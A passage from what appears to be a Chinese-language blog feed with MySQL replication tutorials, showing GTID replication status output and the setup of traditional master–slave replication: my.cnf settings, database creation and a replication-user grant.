class="line">                Last_IO_Errno: 0</span><br><span class="line">                Last_IO_Error: </span><br><span class="line">               Last_SQL_Errno: 0</span><br><span class="line">               Last_SQL_Error: </span><br><span class="line">  Replicate_Ignore_Server_Ids: </span><br><span class="line">             Master_Server_Id: 11</span><br><span class="line">                  Master_UUID: 03a1eb63-c21a-11ec-b07f-000c2987bea6</span><br><span class="line">             Master_Info_File: /var/lib/mysql/master.info</span><br><span class="line">                    SQL_Delay: 0</span><br><span class="line">          SQL_Remaining_Delay: NULL</span><br><span class="line">      Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates</span><br><span class="line">           Master_Retry_Count: 86400</span><br><span class="line">                  Master_Bind: </span><br><span class="line">      Last_IO_Error_Timestamp: </span><br><span class="line">     Last_SQL_Error_Timestamp: </span><br><span class="line">               Master_SSL_Crl: </span><br><span class="line">           Master_SSL_Crlpath: </span><br><span class="line">           Retrieved_Gtid_Set: 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25</span><br><span class="line">            Executed_Gtid_Set: 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25</span><br><span class="line">                Auto_Position: 1</span><br><span class="line">         Replicate_Rewrite_DB: </span><br><span class="line">                 Channel_Name: </span><br><span class="line">           Master_TLS_Version: </span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| BOOK               |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| testbookdb         |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">6 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">use</span> testbookdb;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup <span class="keyword">with</span> -A</span><br><span class="line"></span><br><span class="line"><span class="keyword">Database</span> <span class="keyword">changed</span></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">tables</span>;</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| Tables_in_testbookdb |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| book1                |</span><br><span class="line">| book2                |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">2 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> book1;</span><br><span class="line">+<span class="comment">---------+-----------------------------------+-------+-----------------------+</span></span><br><span class="line">| bTypeId | bName                             | price | publishing            |</span><br><span class="line">+<span class="comment">---------+-----------------------------------+-------+-----------------------+</span></span><br><span class="line">|       1 | &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;             |    66 | &#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       2 | &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;                    |    68 | &#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       3 | &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;            |    90 | &#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       4 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;                   |    71 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       5 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B;                  |    72 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       6 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B;                  |    73 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       7 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B;                  |    74 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       8 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B;                  |    75 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|       9 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B;                  |    76 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|      10 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B;                  |    77 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|      11 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B;                  |    78 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">|      12 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B;                  |    79 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |</span><br><span class="line">+<span class="comment">---------+-----------------------------------+-------+-----------------------+</span></span><br><span class="line">12 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> book2;</span><br><span class="line">+<span class="comment">-----------------------------------+-------+-------+</span></span><br><span class="line">| name                              | price | pages |</span><br><span class="line">+<span class="comment">-----------------------------------+-------+-------+</span></span><br><span class="line">| &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;             |    30 |   666 |</span><br><span class="line">| &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;                    |    60 |   666 |</span><br><span class="line">| &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;            |    80 |   666 |</span><br><span class="line">| &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;                   |   166 |   666 |</span><br><span class="line">+<span class="comment">-----------------------------------+-------+-------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">master</span> <span class="keyword">status</span>;</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+-------------------------------------------+</span></span><br><span class="line">| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set                         |</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+-------------------------------------------+</span></span><br><span class="line">| mysql-bin.000002 |     7113 |              |                  | 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25 |</span><br><span class="line">+<span class="comment">------------------+----------+--------------+------------------+-------------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;MySQL-GTID-&amp;#x4E3B;&amp;#x4ECE;&amp;#x540C;&amp;#x6B65;&quot;&gt;&lt;a href=&quot;#MySQL-GTID-&amp;#x4E3B;&amp;#x4ECE;&amp;#x540C;&amp;#x6B65;&quot; class=&quot;headerlink&quot; title=&quot;MySQL 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL传统主从同步</title>
    <link href="https://marnm.github.io//posts/607e4760/"/>
    <id>https://marnm.github.io//posts/607e4760/</id>
    <published>2022-06-07T04:44:52.000Z</published>
    <updated>2022-06-07T05:12:49.929Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x73AF;&#x5883;"><a href="#&#x73AF;&#x5883;" class="headerlink" title="&#x73AF;&#x5883;"></a>&#x73AF;&#x5883;</h2><table><thead><tr><th><strong>&#x4E3B;&#x673A;&#x540D;</strong></th><th><strong>IP</strong></th><th><strong>&#x7CFB;&#x7EDF;/MySQL&#x7248;&#x672C;</strong></th><th>&#x89D2;&#x8272;</th></tr></thead><tbody><tr><td>MySQL_1</td><td>192.168.10.67</td><td>RHEL7.3/MySQL5.7</td><td>Master</td></tr><tr><td>MySQL_2</td><td>192.168.10.68</td><td>RHEL7.3/MySQL5.7</td><td>Slave</td></tr></tbody></table><h2 id="&#x539F;&#x7406;"><a href="#&#x539F;&#x7406;" class="headerlink" title="&#x539F;&#x7406;"></a>&#x539F;&#x7406;</h2><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://192.168.85.188:8081/uploads/1652922895516766641123.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>1)&#x3001;&#x5728;master&#x673A;&#x5668;&#x4E0A;&#x7684;&#x64CD;&#x4F5C;&#xFF1A;</p><p>&#x3000;  &#x5F53;master&#x4E0A;&#x7684;&#x6570;&#x636E;&#x53D1;&#x751F;&#x53D8;&#x5316;&#x65F6;&#xFF0C;&#x8BE5;&#x4E8B;&#x4EF6;&#x53D8;&#x5316;&#x4F1A;&#x6309;&#x7167;&#x987A;&#x5E8F;&#x5199;&#x5165;bin-log&#x4E2D;&#x3002;&#x5F53;slave&#x94FE;&#x63A5;&#x5230;master&#x7684;&#x65F6;&#x5019;&#xFF0C;master&#x673A;&#x5668;&#x4F1A;&#x4E3A;slave&#x5F00;&#x542F;binlog dump&#x7EBF;&#x7A0B;&#x3002;&#x5F53;master&#x7684;binlog&#x53D1;&#x751F;&#x53D8;&#x5316;&#x7684;&#x65F6;&#x5019;&#xFF0C;bin-log dump&#x7EBF;&#x7A0B;&#x4F1A;&#x901A;&#x77E5;slave&#xFF0C;&#x5E76;&#x5C06;&#x76F8;&#x5E94;&#x7684;binlog&#x5185;&#x5BB9;&#x53D1;&#x9001;&#x7ED9;slave&#x3002;</p><p>2)&#x3001;&#x5728;slave&#x673A;&#x5668;&#x4E0A;&#x64CD;&#x4F5C;&#xFF1A;</p><p>&#x3000;  &#x5F53;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x5F00;&#x542F;&#x7684;&#x65F6;&#x5019;&#xFF0C;slave&#x4E0A;&#x4F1A;&#x521B;&#x5EFA;&#x4E24;&#x4E2A;&#x7EBF;&#x7A0B;&#xFF1A;I/O&#x7EBF;&#x7A0B;&#x3002;&#x8BE5;&#x7EBF;&#x7A0B;&#x8FDE;&#x63A5;&#x5230;master&#x673A;&#x5668;&#xFF0C;master&#x673A;&#x5668;&#x4E0A;&#x7684;binlog dump &#x7EBF;&#x7A0B;&#x4F1A;&#x5C06;binlog&#x7684;&#x5185;&#x5BB9;&#x53D1;&#x9001;&#x7ED9;&#x8BE5;I/O&#x7EBF;&#x7A0B;&#x3002;&#x8BE5;I/O&#x7EBF;&#x7A0B;&#x63A5;&#x6536;&#x5230;binlog&#x5185;&#x5BB9;&#x540E;&#xFF0C;&#x518D;&#x5C06;&#x5185;&#x5BB9;&#x5199;&#x5165;&#x5230;&#x672C;&#x5730;&#x7684;relay log&#xFF1B;sql&#x7EBF;&#x7A0B;&#x3002;&#x8BE5;&#x7EBF;&#x7A0B;&#x8BFB;&#x53D6;&#x5230;I/O&#x7EBF;&#x7A0B;&#x5199;&#x5165;&#x7684;relay log&#x3002;&#x5E76;&#x4E14;&#x6839;&#x636E;replay log&#x3002;&#x5E76;&#x4E14;&#x6839;&#x636E;relay log &#x7684;&#x5185;&#x5BB9;&#x5BF9;slave&#x6570;&#x636E;&#x5E93;&#x505A;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p><p>3)&#x3001;MySQL&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x539F;&#x7406;&#x56FE;&#x5982;&#x4E0B;:</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://192.168.85.188:8081/uploads/1652922926865746299theory.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>&#x4ECE;&#x5E93;&#x751F;&#x6210;&#x4E24;&#x4E2A;&#x7EBF;&#x7A0B;&#xFF0C;&#x4E00;&#x4E2A;I/O&#x7EBF;&#x7A0B;&#xFF0C;&#x4E00;&#x4E2A;SQL&#x7EBF;&#x7A0B;&#xFF1B;<br>I/O&#x7EBF;&#x7A0B;&#x53BB;&#x8BF7;&#x6C42;&#x4E3B;&#x5E93;&#x7684;binlog&#xFF0C;&#x5E76;&#x5C06;&#x5F97;&#x5230;&#x7684;binlog&#x65E5;&#x5FD7;&#x5199;&#x5230;relay log&#xFF08;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#xFF09; &#x6587;&#x4EF6;&#x4E2D;&#xFF1B;<br>&#x4E3B;&#x5E93;&#x4F1A;&#x751F;&#x6210;&#x4E00;&#x4E2A; log dump &#x7EBF;&#x7A0B;&#xFF0C;&#x7528;&#x6765;&#x7ED9;&#x4ECE;&#x5E93;I/O&#x7EBF;&#x7A0B;&#x4F20;binlog&#xFF1B;<br>SQL &#x7EBF;&#x7A0B;&#xFF0C;&#x4F1A;&#x8BFB;&#x53D6;relay log&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x65E5;&#x5FD7;&#xFF0C;&#x5E76;&#x89E3;&#x6790;&#x6210;&#x5177;&#x4F53;&#x64CD;&#x4F5C;&#xFF0C;&#x6765;&#x5B9E;&#x73B0;&#x4E3B;&#x4ECE;&#x7684;&#x64CD;&#x4F5C;&#x4E00;&#x81F4;&#xFF0C;&#x800C;&#x6700;&#x7EC8;&#x6570;&#x636E;&#x4E00;&#x81F4;&#xFF1B;  </p><p><span style="color:red"><em>&#x6CE8;&#x610F;&#xFF1A;&#x642D;&#x5EFA;MySQL&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x524D;&#xFF0C;&#x9700;&#x8981;&#x5206;&#x522B;&#x5728;&#x4E3B;&#x6570;&#x636E;&#x548C;&#x4ECE;&#x6570;&#x636E;&#x4E0A;&#x5B89;&#x88C5;&#x5E76;&#x914D;&#x7F6E;&#x597D;MySQL&#x6570;&#x636E;&#x5E93;&#xFF01;  </em></span></p><h2 id="&#x914D;&#x7F6E;-Master-192-168-10-67"><a href="#&#x914D;&#x7F6E;-Master-192-168-10-67" class="headerlink" title="&#x914D;&#x7F6E; Master 192.168.10.67"></a>&#x914D;&#x7F6E; Master 192.168.10.67</h2><h3 id="&#x914D;&#x7F6E;-etc-my-cnf"><a href="#&#x914D;&#x7F6E;-etc-my-cnf" class="headerlink" title="&#x914D;&#x7F6E; /etc/my.cnf"></a>&#x914D;&#x7F6E; /etc/my.cnf</h3><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@MySQL1&#xA0;mysql&#x2010;5.7.19]#&#xA0;vim&#xA0;/etc/my.cnf</span><br><span class="line">[client]</span><br><span class="line">port=3306</span><br><span class="line">socket=/data/mysql/mysql.sock</span><br><span class="line"></span><br><span class="line">[mysqld]  </span><br><span class="line">character&#x2010;set&#x2010;server=utf8</span><br><span class="line">collation&#x2010;server=utf8_general_ci</span><br><span class="line"></span><br><span class="line">skip&#x2010;name&#x2010;resolve</span><br><span class="line">user=mysql</span><br><span class="line">port=3306</span><br><span class="line">basedir=/usr/local/mysql57</span><br><span class="line">datadir=/data/mysql</span><br><span class="line">tmpdir=/tmp</span><br><span class="line">socket=/data/mysql/mysql.sock</span><br><span class="line"></span><br><span class="line">log&#x2010;error=/data/mysql/mysqld.log</span><br><span class="line">pid&#x2010;file=/data/mysql/mysqld.pid</span><br><span class="line"></span><br><span class="line">log&#x2010;bin=mysql&#x2010;bin&#x2010;master&#xA0;#&#x542F;&#x7528;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;</span><br><span class="line">binlog_format=mixed</span><br><span class="line">server&#x2010;id=1&#xA0;#&#x672C;&#x673A;&#x6570;&#x636E;&#x5E93;ID&#xA0;&#x6807;&#x793A;</span><br><span class="line">binlog&#x2010;do&#x2010;db=TESTDB&#xA0;#&#x53EF;&#x4EE5;&#x88AB;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x590D;&#x5236;&#x7684;&#x5E93;,&#xA0;&#x4E8C;&#x8FDB;&#x5236;&#x9700;&#x8981;&#x540C;&#x6B65;&#x7684;&#x6570;&#x636E;&#x5E93;&#x540D;</span><br><span class="line">binlog&#x2010;ignore&#x2010;db=mysql&#xA0;#&#x4E0D;&#x53EF;&#x4EE5;&#x88AB;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x590D;&#x5236;&#x7684;&#x5E93;</span><br><span class="line">lower_case_table_names=1</span><br><span class="line">#&#x6CE8;&#x610F;&#xFF1A;Linux&#x4E0B;&#x90E8;&#x7F72;&#x5B89;&#x88C5;MySQL&#xFF0C;&#x9ED8;&#x8BA4;&#x4E0D;&#x5FFD;&#x7565;&#x8868;&#x540D;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x9700;&#x8981;&#x624B;&#x52A8;&#x5230;/etc/my.cnf&#xA0;&#x4E0B;&#x914D;&#x7F6E;&#xA0;lower_case_table_names=1&#xA0;&#x4F7F;Linux&#x73AF;&#x5883;&#x4E0B;MySQL&#x5FFD;&#x7565;&#x8868;&#x540D;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x5426;&#x5219;&#x4F7F;&#x7528;MyCAT&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x63D0;&#x793A;&#x627E;&#x4E0D;&#x5230;&#x8868;&#x7684;&#x9519;&#x8BEF;&#xFF01;</span><br><span class="line"> ~</span><br><span class="line"> ~</span><br><span class="line">&quot;/etc/my.cnf&quot;&#xA0;24L,&#xA0;556C&#xA0;written</span><br></pre></td></tr></tbody></table></figure><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@MySQL1&#xA0;~]#&#xA0;service&#xA0;mysqld&#xA0;restart</span><br><span class="line">Shutting&#xA0;down&#xA0;MySQL...........&#xA0;SUCCESS!</span><br><span class="line">Starting&#xA0;MySQL.&#xA0;SUCCESS!</span><br></pre></td></tr></tbody></table></figure><p>&#x521B;&#x5EFA;&#x8981;&#x540C;&#x6B65;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5E76;&#x521B;&#x5EFA;&#x8868;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@MySQL1&#xA0;mysql&#x2010;5.7.19]<span class="comment">#&#xA0;mysql -uroot -pJaking@vip.163.com</span></span><br><span class="line">mysql&gt;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> TESTDB;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line"><span class="keyword">use</span> TESTDB;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> TABLE666 (bTypeId <span class="built_in">int</span>,bName <span class="built_in">char</span>(<span class="number">16</span>),price <span class="built_in">int</span>,publishing <span class="built_in">char</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">mysql&gt; CREATE DATABASE TESTDB;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">| testdb             |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">5 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">use</span> TESTDB;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; CREATE TABLE TABLE666 (bTypeId int,bName char(16),price int,publishing char(16));</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6388;&#x6743;<br></p><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">[root@MySQL1&#xA0;mysql&#x2010;5.7.19]<span class="comment">#&#xA0;mysql -uroot -pJaking@vip.163.com</span></span><br><span class="line"><span class="comment">#&#x5982;&#x679C;&#x63D0;&#x793A;&#xA0;mysql&#xA0;&#x547D;&#x4EE4;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x8BF7;&#x5C1D;&#x8BD5;&#x7528;&#xA0;/usr/local/mysql57/bin/mysql&#xA0;&#x2010;uroot&#xA0;&#x2010;p&quot;Jaking@vip.163.com&quot;&#xA0;&#x6765;&#x767B;&#x5F55;MySQL&#x6570;&#x636E;&#x5E93;</span></span><br><span class="line">mysql:&#xA0;[Warning]&#xA0;Using&#xA0;a&#xA0;password&#xA0;on&#xA0;the&#xA0;command&#xA0;line&#xA0;interface&#xA0;can&#xA0;be&#xA0;insecure.</span><br><span class="line">Welcome&#xA0;to&#xA0;the&#xA0;MySQL&#xA0;monitor.&#xA0;Commands&#xA0;<span class="keyword">end</span>&#xA0;<span class="keyword">with</span>&#xA0;;&#xA0;or&#xA0;\g.</span><br><span class="line">Your&#xA0;MySQL&#xA0;connection&#xA0;id&#xA0;is&#xA0;3</span><br><span class="line">Server&#xA0;version:&#xA0;5.7.19&#x2010;log&#xA0;Source&#xA0;distribution</span><br><span class="line"></span><br><span class="line">Copyright&#xA0;(c)&#xA0;2000,&#xA0;2017,&#xA0;Oracle&#xA0;and/or&#xA0;its&#xA0;affiliates.&#xA0;All&#xA0;rights&#xA0;reserved.</span><br><span class="line"></span><br><span class="line">Oracle&#xA0;is&#xA0;a&#xA0;registered&#xA0;trademark&#xA0;of&#xA0;Oracle&#xA0;Corporation&#xA0;and/or&#xA0;its</span><br><span class="line">affiliates.&#xA0;Other&#xA0;names&#xA0;may&#xA0;be&#xA0;trademarks&#xA0;of&#xA0;their&#xA0;respective owners.</span><br><span class="line"></span><br><span class="line">Type&#xA0;&apos;<span class="keyword">help</span>;&apos;&#xA0;or&#xA0;&apos;\h&apos;&#xA0;for&#xA0;help.&#xA0;<span class="keyword">Type</span>&#xA0;<span class="string">&apos;\c&apos;</span>&#xA0;<span class="keyword">to</span>&#xA0;<span class="keyword">clear</span>&#xA0;the&#xA0;<span class="keyword">current</span>&#xA0;<span class="keyword">input</span>&#xA0;statement.</span><br><span class="line"></span><br><span class="line">mysql&gt;&#xA0;<span class="keyword">grant</span> <span class="keyword">replication</span> <span class="keyword">slave</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> <span class="keyword">slave</span>@<span class="string">&quot;192.168.10.%&quot;</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">&quot;Jaking@vip.163.com&quot;</span>;</span><br><span class="line">Query&#xA0;OK,&#xA0;0&#xA0;rows&#xA0;affected,&#xA0;1&#xA0;warning&#xA0;(0.01&#xA0;sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show master status;</span><br><span class="line">+<span class="comment">-------------------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">| File                    | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |</span><br><span class="line">+<span class="comment">-------------------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">| mysql-bin-master.000002 |      154 | TESTDB       | mysql            |                   |</span><br><span class="line">+<span class="comment">-------------------------+----------+--------------+------------------+-------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">show</span> <span class="keyword">binlog</span> <span class="keyword">events</span>\G</span><br><span class="line">*************************** <span class="number">1.</span> <span class="keyword">row</span> ***************************</span><br><span class="line">   Log_name: mysql-<span class="keyword">bin</span>-<span class="keyword">master</span><span class="number">.000001</span></span><br><span class="line">        Pos: <span class="number">4</span></span><br><span class="line"> Event_type: Format_desc</span><br><span class="line">  Server_id: <span class="number">11</span></span><br><span class="line">End_log_pos: <span class="number">123</span></span><br><span class="line">       Info: <span class="keyword">Server</span> ver: <span class="number">5.7</span><span class="number">.24</span>-<span class="keyword">log</span>, <span class="keyword">Binlog</span> ver: <span class="number">4</span></span><br><span class="line">*************************** <span class="number">2.</span> <span class="keyword">row</span> ***************************</span><br><span class="line">   Log_name: mysql-<span class="keyword">bin</span>-<span class="keyword">master</span><span class="number">.000001</span></span><br><span class="line">        Pos: <span class="number">123</span></span><br><span class="line"> Event_type: Previous_gtids</span><br><span class="line">  Server_id: <span class="number">11</span></span><br><span class="line">End_log_pos: <span class="number">154</span></span><br><span class="line">       Info: </span><br><span class="line">*************************** <span class="number">3.</span> <span class="keyword">row</span> ***************************</span><br><span class="line">   Log_name: mysql-<span class="keyword">bin</span>-<span class="keyword">master</span><span class="number">.000001</span></span><br><span class="line">        Pos: <span class="number">154</span></span><br><span class="line"> Event_type: <span class="keyword">Stop</span></span><br><span class="line">  Server_id: <span class="number">11</span></span><br><span class="line">End_log_pos: <span class="number">177</span></span><br><span class="line">       Info: </span><br><span class="line"><span class="number">3</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; exit</span><br><span class="line">Bye</span><br><span class="line">[root@MySQL1 ~]<span class="comment"># ls /var/lib/mysql</span></span><br><span class="line">auto.cnf         ib_logfile1              performance_schema</span><br><span class="line">ca-key.pem       ibtmp1                   private_key.pem</span><br><span class="line">ca.pem           mysql                    public_key.pem</span><br><span class="line">client-cert.pem  mysql-bin-master.000001  server-cert.pem</span><br><span class="line">client-key.pem   mysql-bin-master.000002  server-key.pem</span><br><span class="line">ib_buffer_pool   mysql-bin-master.index   sys</span><br><span class="line">ibdata1          mysql.sock               